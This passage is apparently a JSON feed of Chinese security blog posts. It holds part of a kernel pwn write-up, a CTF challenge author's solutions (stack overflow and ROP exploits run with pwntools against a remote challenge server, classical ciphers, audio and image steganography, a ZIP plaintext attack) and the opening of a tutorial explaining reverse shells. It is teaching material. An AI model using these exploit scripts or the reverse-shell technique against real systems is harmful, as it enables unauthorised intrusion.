class=\"line\">p.recvuntil(<span class=\"string\">&quot;/ $&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;echo &#x27;&#x27; &gt; b64_exp;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">count = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;now line: &#x27;</span> + <span class=\"built_in\">str</span>(count))</span><br><span class=\"line\">    line = f.readline().replace(<span class=\"string\">&quot;\\n&quot;</span>,<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(line)&lt;=<span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    cmd = <span class=\"string\">b&quot;echo &#x27;&quot;</span> + line.encode() + <span class=\"string\">b&quot;&#x27; &gt;&gt; b64_exp;&quot;</span></span><br><span class=\"line\">    p.sendline(cmd)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;/ $&quot;</span>)</span><br><span class=\"line\">    count += <span class=\"number\">1</span></span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;base64 -d b64_exp &gt; exp.tar.gz;&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;tar -xzvf exp.tar.gz&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;chmod +x ./exp;&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;./exp&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>截图证明顺利的读到 <strong>flag</strong> 。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444669/Typera/2023/04/ec5895eb753ca0112ace1beac830a20a.png\" alt=\"image-20220608113858776\" /></p>\n<h3 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcnR0bmJhMy5jbi8yMDIxLzAzLzAzL05PVEUtMFgwMy1MSU5VWC1LRVJORUwtUFdOLVBBUlQtSUkv\">【NOTES.0x03】Linux Kernel Pwn II：Basic Exploit to Kernel Pwn in CTF - arttnba3's blog</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sa21pZGFzLmdpdGh1Yi5pby9wb3N0cy8yMDIxMDIyMy1saW51eC1rZXJuZWwtcHduLW1vZHByb2JlLw==\">Linux Kernel Exploitation Technique: Overwriting modprobe_path - Midas</span></p>\n",
            "tags": [
                "Crypto",
                "CTF",
                "Web",
                "Miec",
                "Re",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2022%E5%87%BA%E9%A2%98%E9%83%A8%E5%88%86wp/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2022%E5%87%BA%E9%A2%98%E9%83%A8%E5%88%86wp/",
            "title": "CUMTCTF-2022出题部分wp",
            "date_published": "2022-06-08T04:04:04.000Z",
            "content_html": "<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"nc\"><a class=\"anchor\" href=\"#nc\">#</a> nc</h3>\n<p>这题就不说了吧，连上啥都有，我连要用到的命令解释都给了～</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444312/Typera/2023/04/6c7177a450f396a3cc1df92db2cec62b.png\" alt=\"image-20230426013827815\" /></p>\n<h3 id=\"ret2text\"><a class=\"anchor\" href=\"#ret2text\">#</a> ret2text</h3>\n<p>看一下保护：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444337/Typera/2023/04/8810580d090cd91812198696d7ddb02d.png\" alt=\"image-20230426013852620\" /><br />\n 主函数：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444396/Typera/2023/04/b70fb5e227640f018d72822fc557ad7e.png\" alt=\"image-20230426013952537\" /><br />\n 后门函数：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444400/Typera/2023/04/217429008da529ab0c39ef4f51553b97.png\" alt=\"image-20230426013957304\" /></p>\n<p>栈溢出就行，一张好图理解一下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444407/Typera/2023/04/f1fddeaa3a59bd82ab8dbb7032f73399.png\" alt=\"image-20230426014002698\" /></p>\n<p>思路：用 ‘a' 覆盖 buf 一直到覆盖上 ebp，然后将 ret (返回地址) 的地方写入为后门函数的地址。</p>\n<p>双击左侧栏的 backdoor 函数，右侧能找到函数地址如图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444409/Typera/2023/04/0462346171ca0ff7f93c6db0364f57de.png\" alt=\"image-20230426014006566\" /></p>\n<p>直接照思路这么写，能打通本地，但是会打不通远程，因为栈帧没有平衡（hint），这时候中间插个 retn 的 gadget 就能解决。</p>\n<p>随便找个 retn 的地址<br />\n这个就能用：</p>\n<p>最后，脚本如下（环境没关，可以继续打远程）：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444413/Typera/2023/04/d5ad6da67403e757b9bc721f47816524.png\" alt=\"image-20230426014010146\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r=process(b&#x27;./ret2text&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">b&#x27;106.15.52.194&#x27;</span>,<span class=\"number\">10002</span>)</span><br><span class=\"line\">backdoor=<span class=\"number\">0x4011DD</span></span><br><span class=\"line\">retn=<span class=\"number\">0x401203</span></span><br><span class=\"line\">p=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">40</span>+p64(retn)+p64(backdoor)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;2022!&#x27;</span>,p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"overflow\"><a class=\"anchor\" href=\"#overflow\">#</a> overflow</h3>\n<p>保护和之前 ret2text 的一样，<br />\n同样可以使用栈溢出漏洞，但是没有一个写好的 backdoor 函数了。</p>\n<p>shift+F12 查看字符串，能找到 /bin/sh ，双击得到地址为：0x404050<br />\n 左侧也能找到 system () 函数，<br />\n这时我们可以通过 rop 将 /bin/sh 装入 system () 函数中来 getshell。</p>\n<p>具体 ROP 时什么东西可以自行搜索，这里详细说一下怎么利用，<br />\n有了 system，有了 /bin/sh，唯一的问题就是传参了（因为 我们要的是 system (&quot;/bin/sh&quot;)，要把 /bin/sh 当作参数传到 system 执行嘛），<br />\n我们可以用 rop 做到这一点：<br />\n64 位程序通过寄存器存放参数，所以我们可以用 pop rdi 将 /bin/sh 字串的地址压入 rdi，然后 ret，再把 esp 指向 system () 函数地址执行就能 getshell 了。</p>\n<p>所以，我们只需要用到 pop rdi ret 一个 gadget，用 ROPgadget 工具搜索一下就能得到地址，命令如下：<br />\n <code>ROPgadget --binary overflow --only &quot;pop|ret&quot;</code></p>\n<p>最后还有平衡栈帧的问题注意一下，脚本如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./overflow&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">b&#x27;106.15.52.194&#x27;</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x4012e3</span></span><br><span class=\"line\">bin_sh=<span class=\"number\">0x404050</span></span><br><span class=\"line\">system=<span class=\"number\">0x401090</span></span><br><span class=\"line\">retn=<span class=\"number\">0x40101a</span></span><br><span class=\"line\">p=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">11</span> + p64(pop_rdi) + p64(bin_sh) + p64(retn) + p64(system)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;name?\\n&#x27;</span>,p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"caesar\"><a class=\"anchor\" href=\"#caesar\">#</a> Caesar</h3>\n<p>简单的凯撒加密...<br />\n 写个脚本遍历，或者网上找个线上的解密网站一位位地试，或者你能直接猜出来内容，都行...<br />\n 贴个遍历所有结果的脚本：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">model = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class=\"line\">model2 = <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">str1 = <span class=\"string\">&quot;Fdhvdu_lv_wrr_Hdcb&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> key <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">27</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> str1:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> s.islower():</span><br><span class=\"line\">            n = model.find(s)</span><br><span class=\"line\">            s = model[n-key]</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> s.isupper():</span><br><span class=\"line\">            n = model2.find(s)</span><br><span class=\"line\">            s = model2[n-key]</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(s, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><br />\n 得到 flag 内容为 Caesar_is_too_Eazy<br />\n（不觉着放眼望去只有这个能读通吗？）</p>\n<h3 id=\"caesar-2\"><a class=\"anchor\" href=\"#caesar-2\">#</a> Caesar？</h3>\n<p>凯撒 + 栅栏<br />\n密文：fwid_huqifxf {vFv_ghhpwHbddd_q}<br />\n 结合题目知道这不是简单的凯撒，观察密文结构，仔细观察 {} 和 _ 的位置，基本能猜到是栅栏吧。。。</p>\n<p>用上题脚本遍历，挑出 f、c、b 开头的字串逐一尝试栅栏解密，可以得到最终的 flag<br />\n（因为栅栏不会改变第一个字母，所以分别是 flag、cumtctf、bxsctf，逐一尝试即可）。<br />\n虽然理论上来说两个解密的顺序反一反都能出，但这样更好解一点...</p>\n<p>ps：栅栏每组字数为 3</p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"fifo-lru-opt\"><a class=\"anchor\" href=\"#fifo-lru-opt\">#</a> fifo &amp; lru &amp; opt</h3>\n<p>本来还想放提示，没想到做出来的人挺多。<br />\n关于这三个算法，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ob3ViYi5naXRodWIuaW8vMjAyMC8xMC8wNC9vcy0xMC1wYWdlLWV4Y2hhbmdl\">这篇博客</span>上都有了，就不多赘述了。<br />\n如果感兴趣的话，其他相关的算法这篇博客上也都有，挺全面的。</p>\n<p>fifo 算法内存状态为：<br />\n1  2  1  3  2  2  6  6  7  2  1  2  7  2  6<br />\n1  1  1  1  1  1  1  1  7  7  7  7  7  7  7<br />\n2  2  2  2  2  2  2  2  2  1  1  1  1  1<br />\n3  3  3  3  3  3  3  3  2  2  2  2<br />\n6  6  6  6  6  6  6  6  6<br />\n 调入队列为 1  2  3  6  7  1  2</p>\n<p>lru 算法内存状态为：<br />\n1  2  1  3  2  2  6  6  7  2  1  2  7  2  6<br />\n1  1  1  1  1  1  1  1  7  7  7  7  7  7  7<br />\n2  2  2  2  2  2  2  2  2  2  2  2  2  2<br />\n3  3  3  3  3  3  3  1  1  1  1  1<br />\n6  6  6  6  6  6  6  6  6<br />\n 调入队列为 1  2  3  6  7  1</p>\n<p 123671212367112367=\"\">opt 算法内存状态为：<br />\n1  2  1  3  2  2  6  6  7  2  1  2  7  2  6<br />\n1  1  1  1  1  1  1  1  1  1  1  1  1  1  1<br />\n2  2  2  2  2  2  2  2  2  2  2  2  2  2<br />\n3  3  3  3  3  7  7  7  7  7  7  7<br />\n6  6  6  6  6  6  6  6  6<br />\n 调入队列为 1  2  3  6  7<br />\n 三者连起来得到 flag：cumtctf</p>\n<h3 id=\"套\"><a class=\"anchor\" href=\"#套\">#</a> 套！</h3>\n<p>这道题，说实话就是拿来娱乐一下，送送分的 (/▽＼)...<br />\n 分三步：</p>\n<ol>\n<li>新约佛论禅（<span class=\"exturl\" data-url=\"aHR0cDovL2hpLnBjbW9lLm5ldC9idWRkaGEuaHRtbA==\">解密网址</span>）</li>\n<li>Ook!（<span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29sLnlzbmVrby5jb20vYnJhaW5mdWNrLw==\">Brainfuck / Ook!</span>）</li>\n<li>Brainfuck（网址与 Ook 一样）</li>\n</ol>\n<h3 id=\"左右\"><a class=\"anchor\" href=\"#左右\">#</a> 左 &amp; 右</h3>\n<p>音频隐写<br />\n一个原音频（Counting_Stars.wav），一个修改过的（out.wav）</p>\n<p>我出题的过程：把 flag 加密成摩斯密码，把摩斯密码分成两部分，用脚本输出为摩斯电码音频，左右声道分别和原音频相加，同时右声道反向。<br />\n因为左右声道藏的内容不太一样，所以不能直接相加...</p>\n<p>用 Audacity 打开两个音频，放大查看如下（还是挺明显的吧）：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444431/Typera/2023/04/58af7c321f6bb65d3a0870493389096c.png\" alt=\"image-20230426014027631\" /><br />\n 所以，得到摩斯的方法：out 的左声道 - 原音频左声道，可得前半部分 flag，out 的右声道 + 原音频右声道，可得后半部分 flag</p>\n<p>至于怎么加怎么减，我是使用 python 写的脚本，当然还有其他方法（比如有个同学使用的 Au，我是真没想到可以这么解），<br />\n不过个人觉着都可以试着用 python 写写看，这样以后遇到类似的题目，即使可能用不了其他的方法，或许你也可以用 python 解决。<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> wave</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\">ori = wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;Counting_Stars.wav&quot;</span>,<span class=\"string\">&#x27;rb&#x27;</span>)\t<span class=\"comment\"># 原音频</span></span><br><span class=\"line\">out = wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;out.wav&quot;</span>,<span class=\"string\">&#x27;rb&#x27;</span>)\t\t\t\t<span class=\"comment\"># 隐写音频</span></span><br><span class=\"line\">exp = wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;exp.wav&quot;</span>,<span class=\"string\">&#x27;wb&#x27;</span>)\t\t\t\t<span class=\"comment\"># 处理过后得到的摩斯电码音频</span></span><br><span class=\"line\">exp.setnchannels(<span class=\"number\">2</span>)\t\t\t<span class=\"comment\"># 设置声道数为2</span></span><br><span class=\"line\">exp.setsampwidth(<span class=\"number\">2</span>)\t\t\t<span class=\"comment\"># 设置量化位数为2</span></span><br><span class=\"line\">exp.setframerate(<span class=\"number\">44100</span>)\t\t<span class=\"comment\"># 设置采样频率为44100</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(out.getnframes()):\t\t\t<span class=\"comment\"># 一帧帧地读取数据</span></span><br><span class=\"line\">\tlori,rori=struct.unpack(<span class=\"string\">&#x27;hh&#x27;</span>, ori.readframes(<span class=\"number\">1</span>))\t<span class=\"comment\"># 原音频左右声道数据分别存入lori、rori</span></span><br><span class=\"line\">\tlout,rout=struct.unpack(<span class=\"string\">&#x27;hh&#x27;</span>, out.readframes(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tlexp = lout - lori\t\t<span class=\"comment\"># 左声道相减，存入lexp</span></span><br><span class=\"line\">\trexp = rout + rori</span><br><span class=\"line\">\texp.writeframes(struct.pack(<span class=\"string\">&#x27;hh&#x27;</span>,lexp,rexp))\t\t<span class=\"comment\"># 把lexp、rexp的数据打包后存入exp.wav</span></span><br></pre></td></tr></table></figure><br />\n 解出 exp.wav 之后，去摩斯解密的网站解密即可得到 flag 的内容。</p>\n<h3 id=\"嘿嘿压缩包\"><a class=\"anchor\" href=\"#嘿嘿压缩包\">#</a> 嘿嘿，压缩包？</h3>\n<p>简单的 LSB + ZIP 压缩包 + SSTV</p>\n<p>给了一张图和一个压缩包，<br />\n注意图片的名字是 hint.png。。。</p>\n<p>stegsolve 打开，LSB 隐写能看到提示信息：<br />\n1.Plaintext_Attack 2. zSdL#Z7oym!9j8m3</p>\n<p>第一个提示明文攻击，第二个是密码<br />\n（可能是我的密码设置的有问题？最后一位是 3，可能有点迷惑性...）</p>\n<p>打开压缩包，里面有一个名字一样的图片，用同样的压缩算法压缩已知图片，观察二者的 CRC 校验码一致，结合之前的提示，用 ARCHPR 使用明文攻击解开<br />\n（这里出 bug 了，最后压缩的时候放错了一个压缩包，导致明文攻击失败，现文件已更新）<br />\n明文攻击后，可以获得压缩包 flag.zip，可使用之前 LSB 得到的密码解开.</p>\n<p>解开后，获得音频文件 flag.wav，可以听出来是 SSTV  （。＾▽＾）</p>\n<p>最后，使用 robot36 解码 SSTV 音频，可以解出图片如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444438/Typera/2023/04/d80937655349012b4803de6fadc1e8de.png\" alt=\"image-20230426014034071\" /><br />\n（robot36 为安卓端软件)</p>\n<p>扫码得到 flag</p>\n<h3 id=\"12_bubu_cli\"><a class=\"anchor\" href=\"#12_bubu_cli\">#</a> 12_bubu_cli</h3>\n<p>nc 81.68.81.111 2333<br />\n 输出如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444445/Typera/2023/04/9aacfad409013817db6c5378063a2777.png\" alt=\"image-20230426014040530\" /></p>\n<p>先仔细观察一下输出的东西，在命令行里，我们可以发现，输出的是一些带颜色的数字 9，这些数字 9 组成了一张张的图片。（应该能看出来是几张图片，对吧）</p>\n<p>然后我们把输出的内容保存到文本文件里查看：nc 81.68.81.111 2333 &gt; 1.txt<br />\n 大致内容如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444454/Typera/2023/04/8032d3085f735ce7f02fb11e33c5ca60.png\" alt=\"image-20230426014048819\" /></p>\n<p>可以看到， <code>&lt;0x1b&gt;[</code> （即  <code>\\x1b[</code> ）将文本分割成了很多组，这就是 ANSI 转义字符。</p>\n<p>ANSI 转义字符用  <code>ESC[</code> 打头，而 <code>ESC</code>  用 ASCII 码表示为 <code>\\x1b</code> （十六进制的 <code>1b</code> ）</p>\n<p>涉及到的转义字符<strong>解释</strong>：<br />\n <code>\\x1b[nA</code> ：光标上移 n 行<br />\n <code>\\x1b[38;</code> ：设置前景色，后跟  <code>5;n</code>  代表使用 8 位 256 颜色码，后跟  <code>2;r;g;b</code>  代表 24 位 RGB 颜色码；后接 m 加字符，即为显示的字符</p>\n<p>比如 <code>\\x1b[38;2;0;0;0m5</code> ，就是输出黑色的 5.</p>\n<p>该文件里的输出都是使用 <code>\\x1b[38;2;r;g;bm9</code> ，<br />\n也就是说，我们只要提取出这些字符中间的 r g b 三位，然后用 PIL 组合成图片就行了。</p>\n<p>除此之外，我们还可以注意到：基本上每隔一段字符，会出现固定长度的一串 <code>\\x1b[nA</code> ，<br />\n从上述的解释中，我们已经可以知道，这是让光标上移的转义字符，<br />\n因此，我们大概能够知晓，输出的图片应该就是被这些字符分割的。</p>\n<p>所以，我们可以推断出，图片的长度应该是 <code>\\x1b[nA</code>  字符的个数 -1，<br />\n从而我们获得了图片的长度为 200，<br />\n同样的，我们也可以通过统计一行上 <code>\\x1b[38;</code>  字符的个数，确定宽度也为 200.<br />\n（这两个数据都是使用 PIL 生成图片时必须的）</p>\n<p>转换脚本如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;1.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">    farmes = fp.read().split(<span class=\"string\">&quot;\\x1b[A&quot;</span>*<span class=\"number\">201</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\">farmes.pop(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> frame <span class=\"keyword\">in</span> farmes:</span><br><span class=\"line\">    rgb_list = re.findall(<span class=\"string\">r&quot;\\[38;2;(\\d*);(\\d*);(\\d*)m&quot;</span>, frame)</span><br><span class=\"line\">    <span class=\"comment\"># print(frame)</span></span><br><span class=\"line\">    img = Image.new(<span class=\"string\">&quot;RGB&quot;</span>, (<span class=\"number\">200</span>,<span class=\"number\">200</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> w <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(img.size[<span class=\"number\">0</span>]):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(img.size[<span class=\"number\">1</span>]):</span><br><span class=\"line\">            r, g, b = rgb_list[h*<span class=\"number\">200</span> + w]</span><br><span class=\"line\">            img.putpixel((w, h), (<span class=\"built_in\">int</span>(r), <span class=\"built_in\">int</span>(g), <span class=\"built_in\">int</span>(b)))</span><br><span class=\"line\">    img.save(<span class=\"string\">f&quot;frame/<span class=\"subst\">&#123;<span class=\"built_in\">str</span>(i).zfill(<span class=\"number\">4</span>)&#125;</span>.png&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Saved frame/<span class=\"subst\">&#123;<span class=\"built_in\">str</span>(i).zfill(<span class=\"number\">4</span>)&#125;</span>.png&quot;</span>)</span><br><span class=\"line\">    i += <span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<p>现在我们仔细观察一下获得的 29 张图片：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444466/Typera/2023/04/fb1417256ebdb703f6b023d21836f2bf.png\" alt=\"image-20230426014102173\" /></p>\n<p>放大细看，可以发现，大部分图片上都有几个随机出现白点：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444483/Typera/2023/04/02f03d1a519726d4487be9f6f0e3ea8d.png\" alt=\"image-20230426014119100\" /></p>\n<p>无论你是用 ps 还是 画图 或者是其他什么工具查看这些白点的像素，你都会发现它们的 RGB 为（233,233,233）</p>\n<p>接下来的思路是：把 29 张图中 RGB 为（233,233,233）的点提取出来，组成一张新图。<br />\n脚本如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">flag_img=Image.new(<span class=\"string\">&#x27;RGB&#x27;</span>,(<span class=\"number\">200</span>,<span class=\"number\">200</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> name <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">29</span>):</span><br><span class=\"line\">    img = Image.<span class=\"built_in\">open</span>(<span class=\"string\">f&quot;frame/<span class=\"subst\">&#123;<span class=\"built_in\">str</span>(name).zfill(<span class=\"number\">4</span>)&#125;</span>.png&quot;</span>)</span><br><span class=\"line\">    img = img.convert(<span class=\"string\">&quot;RGB&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> w <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(img.size[<span class=\"number\">0</span>]):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(img.size[<span class=\"number\">1</span>]):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> img.getpixel((w,h)) == (<span class=\"number\">233</span>,<span class=\"number\">233</span>,<span class=\"number\">233</span>):</span><br><span class=\"line\">                flag_img.putpixel((w,h),(<span class=\"number\">233</span>,<span class=\"number\">233</span>,<span class=\"number\">233</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">flag_img.save(<span class=\"string\">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure><br />\n 获得的图片如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444530/Typera/2023/04/0abbeb74a9829e5975738dce464003bf.png\" alt=\"cumtctf2022wp14\" /></p>\n",
            "tags": [
                "Python",
                "Crypto",
                "CTF",
                "Misc",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%8F%8D%E5%BC%B9-shell/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%8F%8D%E5%BC%B9-shell/",
            "title": "反弹_shell",
            "date_published": "2022-04-23T13:48:27.000Z",
            "content_html": "<h1 id=\"什么是反弹shell\"><a class=\"anchor\" href=\"#什么是反弹shell\">#</a> 什么是反弹 shell？</h1>\n<p><strong>正向连接</strong>，就是攻击者用自己的<strong>攻击机</strong>连接到<strong>目标主机</strong>的某一端口，<strong>常见</strong>的有 web 服务、ssh、远程桌面等等。</p>\n<p>在<strong>实际情况</strong>下，总会有很多时候，我们<strong>不能</strong>通过正向连接访问到目标主机，这个时候就可以利用<strong>反向连接</strong>来实现。</p>\n<p><strong>反向连接</strong>，通俗来说就是，攻击者<strong>监听</strong>某个攻击机的指定端口，目标主机<strong>主动发起请求</strong>到该端口，并将<strong>命令行的输入输出</strong>转到攻击机上显示。</p>\n<h1 id=\"适用情况\"><a class=\"anchor\" href=\"#适用情况\">#</a> 适用情况</h1>\n<p>反弹 shell 适用于如下几种常见的情况：</p>\n<ul>\n<li>目标机因<strong>防火墙</strong>受限，目标机器只能发送请求，不能接收请求。\n<ul>\n<li>所以让目标机<strong>主动发送请求</strong>到攻击机指定端口来 <strong>getshell</strong><br />\n&lt;br&gt;</li>\n</ul>\n</li>\n<li>目标机端口<strong>被占用</strong>。\n<ul>\n<li>但是<strong>攻击机</strong>不会存在什么<strong>端口限制</strong><br />\n &lt;br&gt;</li>\n</ul>\n</li>\n<li>攻击者<strong>无法预知</strong>目标机什么时候会中病毒、木马，对方的网络环境是什么样的，什么时候开关机。\n<ul>\n<li>所以采用 <strong>监听 + 诱骗目标机主动执行某程序</strong> 的方式获得 <strong>shell</strong><br 